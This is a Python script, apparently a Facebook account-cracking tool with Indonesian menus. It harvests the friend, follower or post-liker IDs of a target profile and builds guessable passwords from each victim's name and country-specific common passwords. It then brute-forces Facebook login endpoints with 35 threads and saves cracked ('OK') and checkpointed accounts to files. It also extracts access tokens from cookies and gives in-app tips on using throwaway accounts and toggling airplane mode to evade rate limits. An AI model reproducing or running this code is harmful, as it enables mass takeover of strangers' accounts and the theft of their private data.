#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta & Rizal

try:
    import requests
except ImportError:
    print("\n[!] Module Requests Belum Terinstall")
    os.system("pip install requests")
try:
    import bs4
except ImportError:
    print("\n[!] Module bs4 Belum Terinstall")
    os.system("pip install bs4")

import requests,bs4,sys,os,random,time,re,json
import bot_follow
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati

host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]

try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()

op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
durasi = ("%s %s %s"%(ha,op,ta))

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

def lang(cookies):
    f=False
    rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
    for i in rr.find_all("a",href=True):
        if "id_ID" in i.get("href"):
            requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
            b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text    
            if "apa yang anda pikirkan sekarang" in b.lower():
                f=True
    if f==True:
        return True
    else:
        exit("[!] Wrong Cookies")
def basecookie():
    if os.path.exists(".cok"):
        if os.path.getsize(".cok") !=0:
            return gets_dict_cookies(open('.cok').read().strip())
        else:menu_log()
    else:menu_log()
def hdcok():
    global host
    hosts=host
    r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
    return r
def gets_cookies(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    return "".join(result)
def gets_dict_cookies(cookies):
    result={}
    try:
        for i in cookies.split(";"):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result
    except:
        for i in cookies.split("; "):
            result.update({i.split("=")[0]:i.split("=")[1]})
        return result

def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sCoded By %sDapunta %s& %sRizal\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/Dapunta.Khurayra.X\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/AKUN.KERTASS\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/Dapunta/elite\n"%(O,O,P,O,P,O,O,P,O,P,O,P,O,P,O,P,O,P))

def menu_log():
    os.system('rm -rf token.txt')
    os.system('clear')
    banner()
    print('%s╔══[ %sPilih Metode Login %s]'%(O,P,O))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sLogin Dengan Token'%(O,P,O,P))
    print('%s╠══[%s2%s] %sLogin Dengan Cookies'%(O,P,O,P))
    print('%s╠══[%s3%s] %sTutorial Penggunaan Script'%(O,P,O,P))
    print('%s╠══[%s4%s] %sInfo Author & Team Project'%(O,P,O,P))
    print('%s╠══[%s0%s] %sKeluar'%(O,P,O,P))
    pmu = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pmu in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
            menu()
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
            menu()
        except requests.exceptions.ConnectionError:
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        os.system('clear')
        banner()
        mlaku('%s╔══[%s Tips & Tutorial %s]'%(O,P,O))
        print('%s║'%(O))
        print('%s╠══[%s1%s] %sCara Mengambil Token'%(O,P,O,P))
        print('%s╠══[%s2%s] %sCara Mengambil Cookies'%(O,P,O,P))
        print('%s╠══[%s3%s] %sCara Mendapatkan Target'%(O,P,O,P))
        print('%s╠══[%s4%s] %sCara Selama Proses Crack'%(O,P,O,P))
        pf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
        print('%s║'%(O))
        if pf in ['']:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://youtu.be/IdxphPBMMTU')
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://youtu.be/X7m_O_tZnTc')
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['3','03','003','c']:
            mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
            mlaku('%s║ %s1 %s║ %sSiapkan Akun Tumbal Di Chrome Untuk Proses Crack     %s║'%(O,P,O,P,O))
            mlaku('%s║ %s2 %s║ %sGanti Password Akun Tumbal Terlebih Dahulu           %s║'%(O,P,O,P,O))
            mlaku('%s║ %s3 %s║ %sCari Target Akun Random, Daftar Teman Harus Publik   %s║'%(O,P,O,P,O))
            mlaku('%s║ %s4 %s║ %sTeman (FL) Bebas, Bisa 1K, 2K, 3K, ,4K, Atau 5K      %s║'%(O,P,O,P,O))
            mlaku('%s║ %s5 %s║ %sMakin Banyak Teman, Kemungkinan Makin Banyak Hasil   %s║'%(O,P,O,P,O))
            mlaku('%s║ %s6 %s║ %sKetuk Foto Profil/Sampul Target                      %s║'%(O,P,O,P,O))
            mlaku('%s║ %s7 %s║ %sLihat URL/Link Di Bagian Atas, Terdapat \'id=10001xx\' %s║'%(O,P,O,P,O))
            mlaku('%s║ %s8 %s║ %sNah, Itu Adalah ID Target Yang Siap Untuk Di Crack   %s║'%(O,P,O,P,O))
            mlaku('%s║ %s9 %s║ %sBuka Termux/Linux Kemudian Lanjut Ke Proses Crack    %s║'%(O,P,O,P,O))
            mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['4','04','004','d']:
            mlaku('%s╠═══╦══════════════════════════════════════════════════════╗'%(O))
            mlaku('%s║ %s1 %s║ %sMetode Api : Proses Cepat Tapi Mudah Spam            %s║'%(O,P,O,P,O))
            mlaku('%s║ %s2 %s║ %sMetode Mbasic : Proses Agak Cepat, Jarang Kena Spam  %s║'%(O,P,O,P,O))
            mlaku('%s║ %s3 %s║ %sMetode Mobile : Proses Lambat, Kemungkinan OK Besar  %s║'%(O,P,O,P,O))
            mlaku('%s║ %s4 %s║ %sPilih Negara Akun Target : ID, BD, IN, PK, US, None  %s║'%(O,P,O,P,O))
            mlaku('%s║ %s5 %s║ %sTerdapat Password Bawaan Dan Manual                  %s║'%(O,P,O,P,O))
            mlaku('%s║ %s6 %s║ %sPilih Negara Bertujuan Untuk Menyesuaikan Password   %s║'%(O,P,O,P,O))
            mlaku('%s║ %s7 %s║ %sCrack Menggunakan Kuota Data (Tidak Support Wifi)    %s║'%(O,P,O,P,O))
            mlaku('%s║ %s8 %s║ %sApabila Hasil Tidak Muncul Saat Crack Berjalan       %s║'%(O,P,O,P,O))
            mlaku('%s║ %s9 %s║ %sAktifkan Mode Pesawat 5 Detik Saja                   %s║'%(O,P,O,P,O))
            mlaku('%s╠═══╩══════════════════════════════════════════════════════╝'%(O))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        else:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
            menu_log()
    elif pmu in ['4','04','004','d']:
        os.system('clear')
        banner()
        mlaku('%s╔══[ %sAuthor & Team Project %s]'%(O,P,O))
        mlaku('%s║'%(O))
        mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
        mlaku('%s║     • %sDapunta Khurayra X'%(O,P))
        mlaku('%s║     • %sMuhamad Rizal Fiansyah Id'%(O,P))
        mlaku('%s║'%(O))
        mlaku('%s╠══[%s•%s] %sTeam Project %sRAJA ERROR%s :'%(O,P,O,P,O,P))
        mlaku('%s║     • %sAngga Kurniawan'%(O,P))
        mlaku('%s║     • %sYayan XD'%(O,P))
        mlaku('%s║     • %sBoy Hamzah'%(O,P))
        mlaku('%s║     • %sLatip Harkat'%(O,P))
        mlaku('%s║     • %sZacky Tricker'%(O,P))
        mlaku('%s║     • %sSutan Ubay'%(O,P))
        mlaku('%s║     • %sRizky Dev'%(O,P))
        mlaku('%s║     • %sIqbal Dev'%(O,P))
        mlaku('%s║     • %sAap Afandi'%(O,P))
        mlaku('%s║     • %sFallen'%(O,P))
        mlaku('%s║     • %sHanifan'%(O,P))
        mlaku('%s║     • %sJames'%(O,P))
        mlaku('%s║     • %sAahil'%(O,P))
        mlaku('%s║     • %sAzim'%(O,P))
        mlaku('%s║     • %sTech Abm'%(O,P))
        mlaku('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P))
        jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P))
        os.system('rm -rf token.txt')
        os.system('clear')
        exit()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu_log()

def menu():
    os.system('clear')
    banner()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s╔══[ %sWaduh Ngab %s]%s'%(M,P,M,P))
        print('%s║'%(M))
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = "-"
    try:
        email = open("license/email.txt","r").read()
    except (KeyError,IOError):
        email = "-"
    try:
        api_key = open("license/apikey.txt","r").read()
    except (KeyError,IOError):
        api_key = "-"
    jalan('%s╔══[ %sSelamat Datang %s %s]'%(O,P,n,O))
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sID : %s'%(O,P,O,P,i))
    print('%s╠══[%s•%s] %sIP : %s'%(O,P,O,P,ip))
    print('%s╠══[%s•%s] %sStatus : %sFree User'%(O,P,O,P,O))
    print('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,email))
    print('%s╠══[%s•%s] %sApi Key : %s'%(O,P,O,P,api_key))
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack ID Teman/Publik'%(O,P,O,P))
    print('%s╠══[%s2%s] %sCrack ID Pengikut'%(O,P,O,P))
    print('%s╠══[%s3%s] %sCrack ID Likers Postingan'%(O,P,O,P))
    print('%s╠══[%s4%s] %sMengambil Data Target'%(O,P,O,P))
    print('%s╠══[%s5%s] %sMengambil Jumlah Teman'%(O,P,O,P))
    print('%s╠══[%s6%s] %sCek Hasil Crack'%(O,P,O,P))
    print('%s╠══[%s7%s] %sCek Opsi Hasil Crack'%(O,P,O,P))
    print('%s╠══[%s8%s] %sUser Agent'%(O,P,O,P))
    print('%s╠══[%s0%s] %sLog Out'%(O,P,O,P))
    pm = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pm in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    elif pm in ['0','00','000','i']:
        jalan('%s╚══[%s!%s] %sSampai Jumpa'%(O,P,O,P))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()

def defaultua():
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

def ugen():
    print("%s╠══[%s1%s] %sDapatkan User Agent"%(O,P,O,P))
    print("%s╠══[%s2%s] %sGanti User Agent"%(O,P,O,P))
    print("%s╠══[%s3%s] %sHapus User Agent"%(O,P,O,P))
    print("%s╠══[%s4%s] %sCek User Agent"%(O,P,O,P))
    print("%s╠══[%s0%s] %sKembali"%(O,P,O,P))
    pmu = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pmu in[""]:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M))
            print('%s║'%(M))
            input('%s╚══[ %sKembali %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        os.system("rm -rf ugent.txt")
        jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['4','04','004','d']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Tidak Ditemukan'
        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser))
        jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['0','00','000','h']:
        menu()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))

def publik():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/" + it + "/friends?limit=10000&access_token=" + token)
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
        negara()
        return opsi_crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))

def pengikut():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/" + it + "/subscribers?limit=20000&access_token=" + token)
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
        negara()
        return opsi_crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))

def likers():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/" + it + "/likes?limit=100000&access_token=" + token)
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
        negara()
        return opsi_crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))

def negara():
    os.system('rm -rf negara.txt')
    ngr = input('%s╠══[%s•%s] %sCrack Negara : '%(O,P,O,P)).lower()
    if ngr =="":
        ngr = "-"
    try:
        bh = open('negara.txt','w')
        bh.write(ngr)
        bh.close()
    except (KeyError,IOError):pass

def opsi_crack(file):
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sMetode Api'%(O,P,O,P))
    print('%s╠══[%s2%s] %sMetode Mbasic'%(O,P,O,P))
    print('%s╠══[%s3%s] %sMetode Free FB'%(O,P,O,P))
    print('%s╠══[%s4%s] %sMbasic + Opsi Crack %s(%sPro%s)'%(O,P,O,P,O,P,O))
    put = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    if put in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif put in ['1','01','001','a']:
        crack_api(file)
    elif put in ['2','02','002','b']:
        crack_mbasic(file)
    elif put in ['3','03','003','c']:
        crack_free(file)
    elif put in ['4','04','004','d']:
        pro()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()

def generate(text):
    results=[]
    ct = open('negara.txt', 'r').read()
    for i in text.split(" "):
        if len(i)<1:
            continue
        else:
            i=i.lower()
            if len(i)==1 or len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
                results.append(i+"123")
                results.append(i+"12345")
            else:
                results.append(i+"123")
                results.append(i+"12345")
                results.append(i)
                if "-" in ct:
                    results.append(i+"1234")
                elif 'id' or 'indonesia' or 'indo' or '1' in ct:
                    results.append("sayang")
                    results.append("bismillah")
                    results.append("anjing")
                elif 'bd' or 'bangla' or 'bangladesh' or '2' in ct:
                    results.append("786786")
                    results.append("000786")
                    results.append("102030")
                    results.append("556677")
                elif 'in' or 'ind' or 'india' or '3' in ct:
                    results.append("786786")
                    results.append("112233")
                    results.append("102030")
                    results.append("556677")
                elif 'pk' or 'pakis' or 'pakistan' or '4' in ct:
                    results.append("pakistan")
                    results.append("786786")
                    results.append("000786")
                elif 'us' or 'usa' or 'amerika' or '5' in ct:
                    results.append("123456")
                    results.append("qwerty")
                    results.append("iloveyou")
                    results.append("passwords")
                elif 'old' or 'tua' or '0' in ct:
                    results.append("sayangku")
                    results.append("sayang")
                    results.append("bismillah")
                    results.append("anjing")
                    results.append("123456")
                    results.append("rahasia")
                    results.append("bangsat")
                    results.append("indonesia")
                    results.append("katasandi")
                else:continue
    return results

def log_api(em,pas,hosts):
    ua = open('ugent.txt', 'r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
class crack_api:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        print('%s║'%(O))
        print('%s╠══[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(O,P,O,P))
        while True:
            f = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
            if f=="":continue
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":generate(i.split("•")[1])})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                print('%s║'%(O))
                print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
                print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
                print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
                print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
                ThreadPool(35).map(self.main,self.fl)
                os.remove(self.apk)
                exit()
                break
    def pwlist(self):
        self.pw = input('%s╠══[%s•%s] %sMasukkan Password : '%(O,P,O,P)).split(",")
        if len(self.pw) ==0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            print('%s║'%(O))
            print('%s╠══[%s•%s] %sCrack Sedang Berjalan...'%(O,P,O,P))
            print('%s╠══[%s•%s] %sAkun [OK] Disimpan Ke OK/%s.txt'%(O,P,O,P,tanggal))
            print('%s╠══[%s•%s] %sAkun [CP] Disimpan Ke CP/%s.txt'%(O,P,O,P,tanggal))
            print('%s╚══[%s•%s] %sJika Tidak Ada Hasil, Aktifkan Mode Pesawat (5 Detik)\n'%(O,P,O,P))
